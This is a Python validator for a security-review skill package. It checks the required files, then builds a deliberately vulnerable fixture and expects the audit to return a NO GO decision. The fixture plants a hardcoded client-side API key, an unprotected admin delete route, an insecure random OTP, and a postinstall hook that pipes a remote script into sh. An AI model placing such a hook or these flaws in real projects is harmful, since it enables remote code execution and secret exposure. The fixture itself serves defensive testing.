#!/usr/bin/env python3
"""Validate the Security Release Review V10 skill package."""
from __future__ import annotations

import argparse
import json
import subprocess
import sys
import tempfile
from pathlib import Path


REQUIRED_DIRS = ["scripts", "references", "assets", "agents", "adapters"]
REQUIRED_REFS = [
    "SECURITY_CHECKLIST.md",
    "THREAT_MODEL_GUIDE.md",
    "API_ABUSE_TEST_GUIDE.md",
    "AI_AGENT_SECURITY_GUIDE.md",
    "COST_ABUSE_GUIDE.md",
    "RELEASE_GATE_RULES.md",
    "EVIDENCE_BASED_GATE_GUIDE.md",
    "CLOUD_RUNTIME_CONFIG_GUIDE.md",
    "SUPPLY_CHAIN_GUIDE.md",
    "RESTAURANT_COMPLIANCE_GUIDE.md",
    "RISK_ACCEPTANCE_GUIDE.md",
]
REQUIRED_OUTPUTS = [
    "security-review.json",
    "SECURITY_DASHBOARD.md",
    "REPORT_INDEX.md",
    "SYSTEM_EVALUATION.md",
    "CI_RELEASE_GATE.md",
    "HACKER_SIMULATION.md",
    "CODEX_FIX_PROMPT.md",
    "SECURITY_RELEASE_REVIEW.md",
    "THREAT_MODEL.md",
    "API_SECURITY_MAP.md",
    "API_ABUSE_TESTS.md",
    "FRAMEWORK_SECURITY_REVIEW.md",
    "SECURITY_GATE_BASELINE.md",
    "EXECUTABLE_SECURITY_TESTS.md",
    "AI_RED_TEAM_TESTS.md",
    "AGENT_TOOL_RISK_REVIEW.md",
    "COST_ABUSE_REVIEW.md",
    "CLOUD_RUNTIME_CONFIG_REVIEW.md",
    "SUPPLY_CHAIN_REVIEW.md",
    "GIT_HISTORY_SECRETS.md",
    "RESTAURANT_COMPLIANCE_REVIEW.md",
    "DYNAMIC_SECURITY_TEST.md",
    "EVIDENCE_MATRIX.md",
    "SECURITY_FIX_PLAN.md",
    "PATCH_STRATEGY.md",
    "SEMANTIC_SECURITY_REVIEW.md",
    "PERMISSION_MATRIX_TESTS.md",
    "AUTO_PATCH_DRAFTS.md",
    "ATTACK_PATH_GRAPH.md",
    "RESTAURANT_SECURITY_TEST_PACK.md",
    "DATA_FLOW_TAINT_REVIEW.md",
    "DEPENDENCY_AUDIT_SUMMARY.md",
    "POST_LAUNCH_GUARD.md",
    "RUNTIME_LOG_ANALYSIS.md",
    "ANOMALY_DETECTION_RULES.md",
    "INCIDENT_GAME_DAY.md",
    "SECURITY_DEBT_DASHBOARD.md",
    "TENANT_ISOLATION_DEEP_TESTS.md",
    "LLM_EVAL_SUITE.md",
    "COMPLIANCE_EVIDENCE_PACKAGE.md",
    "SECOPS_ACTIONS.md",
    "SECURITY_DIGITAL_TWIN.md",
    "BUSINESS_RULE_VALIDATION.md",
    "AUTONOMOUS_ATTACK_SIMULATION.md",
    "SECURITY_REGRESSION_LIBRARY.md",
    "CROSS_PROJECT_BASELINE.md",
    "DEPENDENCY_REPUTATION.md",
    "OWNERSHIP_SLA.md",
    "SECURITY_TRENDS.md",
    "PR_SEMANTIC_REVIEW.md",
    "SECURITY_TEST_GENERATOR.md",
    "RISK_KNOWLEDGE_BASE.md",
    "RELEASE_APPROVAL_WORKFLOW.md",
    "SECURITY_SLA.md",
    "FALSE_POSITIVE_FEEDBACK.md",
    "RELEASE_RISK_PREMORTEM.md",
    "ORG_SECURITY_CONTROL_PLANE.md",
    "POLICY_INHERITANCE.md",
    "SECURITY_MEMORY.md",
    "AUTO_FIX_PR_PLAN.md",
    "TRAFFIC_REPLAY_PLAN.md",
    "AI_AGENT_AUDIT.md",
    "RED_TEAM_SCENARIOS.md",
    "RELEASE_CONTRACT.md",
    "RUNTIME_PROTECTION_RECOMMENDATIONS.md",
    "SECURITY_MATURITY_SCORE.md",
    "SECURITY_RETEST_REPORT.md",
    "PR_SECURITY_DELTA.md",
    "RISK_ACCEPTANCE.md",
    "RELEASE_GO_NO_GO.md",
    "security-abuse-tests.mjs",
    "security-review.sarif",
    "junit-security.xml",
]


def fail(message: str) -> None:
    raise SystemExit(f"FAIL: {message}")


def run(cmd: list[str], cwd: Path) -> None:
    completed = subprocess.run(cmd, cwd=str(cwd), text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    if completed.returncode != 0:
        print(completed.stdout)
        fail("command failed: " + " ".join(cmd))


def create_fixture(root: Path) -> None:
    (root / "src/app/api/admin").mkdir(parents=True)
    (root / "src/app").mkdir(parents=True, exist_ok=True)
    (root / "src/app/chat.tsx").write_text(
        '"use client"; const apiKey="sk-real-ish-key-12345678901234567890"; export const systemPrompt="secret";',
        encoding="utf-8",
    )
    (root / "src/app/api/admin/route.ts").write_text(
        "export async function DELETE(req){ await db.user.delete({where:{id:1}}); }",
        encoding="utf-8",
    )
    (root / "src/app/api/otp").mkdir(parents=True, exist_ok=True)
    (root / "src/app/api/otp/route.ts").write_text(
        "export async function POST(req){ await sendSms(phone, Math.random()); }",
        encoding="utf-8",
    )
    (root / "package.json").write_text(
        '{"scripts":{"postinstall":"curl https://example.com/install.sh | sh"}}',
        encoding="utf-8",
    )
    (root / "security-gate.yaml").write_text(
        "public_launch: true\nhas_ai: true\nhas_sms: true\nrequire_dynamic_test: true\n",
        encoding="utf-8",
    )


def main() -> int:
    parser = argparse.ArgumentParser(description="Validate Security Release Review V10 skill")
    parser.add_argument("skill_dir", nargs="?", default=".", help="Skill directory")
    args = parser.parse_args()

    skill = Path(args.skill_dir).resolve()
    if not (skill / "SKILL.md").exists():
        fail("SKILL.md is missing")
    skill_md = (skill / "SKILL.md").read_text(encoding="utf-8", errors="replace")
    if "name:" not in skill_md or "description:" not in skill_md:
        fail("SKILL.md frontmatter must include name and description")
    if "security-release-review" not in skill_md:
        fail("SKILL.md must declare or reference security-release-review")

    for dirname in REQUIRED_DIRS:
        if not (skill / dirname).is_dir():
            fail(f"required directory missing: {dirname}")

    for ref in REQUIRED_REFS:
        if not (skill / "references" / ref).exists():
            fail(f"required reference missing: references/{ref}")

    audit = skill / "scripts" / "security_audit.py"
    if not audit.exists():
        fail("scripts/security_audit.py is missing")

    run([sys.executable, str(audit), "--self-test"], skill)

    with tempfile.TemporaryDirectory() as td:
        fixture = Path(td) / "fixture"
        output = Path(td) / "security-review-test"
        create_fixture(fixture)
        run([sys.executable, str(audit), "--project", str(fixture), "--mode", "all", "--out", str(output)], skill)
        missing = [name for name in REQUIRED_OUTPUTS if not (output / name).exists()]
        if missing:
            fail("missing generated outputs: " + ", ".join(missing))
        payload = json.loads((output / "security-review.json").read_text(encoding="utf-8"))
        if not payload.get("findings"):
            fail("security-review.json should contain findings for fixture")
        if payload.get("decision", {}).get("final_decision") != "NO GO":
            fail("fixture should produce NO GO decision")
        if payload.get("version") != "10.1.0":
            fail("security-review.json should be V10")

    print("validate_skill.py passed")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
